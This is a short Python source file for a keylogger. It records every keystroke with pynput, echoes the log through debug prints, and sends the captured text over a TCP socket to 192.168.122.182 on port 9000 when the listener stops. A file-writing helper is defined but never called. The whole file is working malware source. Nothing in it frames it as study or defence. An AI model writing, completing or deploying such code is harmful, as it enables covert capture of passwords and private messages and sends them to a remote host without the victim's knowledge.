import pynput.keyboard
import socket
import os

log = ""

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += str(key)
    debug_print(log)

def send_logs():
    global log
    if log:
        server_ip = "192.168.122.182"
        port = 9000
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_ip, port))
            s.sendall(log.encode())
        debug_print("Logs sent to server")
        log = ""

def write_file(data):
    with open("keylogs.txt", "a") as f:
        f.write(data)

def debug_print(message):
    print(f"DEBUG: {message}")

with pynput.keyboard.Listener(on_press=on_press) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        send_logs()

send_logs()